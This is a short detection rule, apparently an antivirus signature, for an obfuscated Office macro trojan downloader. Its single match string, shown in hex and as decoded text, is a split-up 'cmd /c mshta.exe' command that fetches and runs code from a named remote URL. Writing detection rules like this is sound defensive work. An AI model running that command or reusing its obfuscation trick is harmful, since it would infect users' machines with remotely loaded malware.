
rule TrojanDownloader_O97M_Obfuse_BENC_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BENC!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {63 20 63 22 20 2b 20 22 6d 64 20 2f 22 20 2b 20 22 63 20 6d 73 68 74 22 20 2b 20 22 61 2e 65 22 20 2b 20 22 78 65 20 68 74 74 70 3a 2f 2f 6c 65 65 68 72 33 36 2e 6d 79 70 72 65 73 73 6f 6e 6c 69 6e 65 2e 63 6f 6d 2f 68 2e 70 68 70 22 } //1 c c" + "md /" + "c msht" + "a.e" + "xe http://leehr36.mypressonline.com/h.php"
	condition:
		((#a_01_0  & 1)*1) >=1
 
}